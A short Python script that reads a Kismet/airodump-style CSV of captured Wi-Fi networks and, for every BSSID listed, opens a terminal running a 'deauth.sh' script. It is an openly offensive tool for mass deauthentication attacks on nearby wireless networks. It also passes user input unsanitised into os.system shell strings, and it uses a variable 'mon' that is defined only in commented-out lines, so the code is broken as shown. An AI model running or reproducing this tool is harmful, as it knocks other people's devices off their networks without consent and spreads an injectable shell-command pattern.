import csv
import os
import time

contacts = []
os.system("ls -la")
print("Select Project")
folder = input()
print("0 for infinitiy")
Time = input()
with open(''+folder+'/'+folder+'-01.kismet.csv') as csv_file:
    csv_reader = csv.reader(csv_file, delimiter=";")
    for row in csv_reader:
        contacts.append(row)

labels = contacts.pop(0)

#print(labels)
#print(contacts)

#print("-"*34)
#print(mon)
for data in contacts:
    out = (f"{data[3]}")
    #mon = "wlan0mon"
    #print(mon)
    #print(out)
    #print(f"{data[3]}")
    os.system("gnome-terminal -- /bin/bash -c './deauth.sh "+Time+" "+out+" "+mon+"; exec bash'")
    #time.sleep(1)

#os.system("gnome-terminal -- /bin/bash -c './deauth.sh "+bssid+" "+mon+"; exec bash'")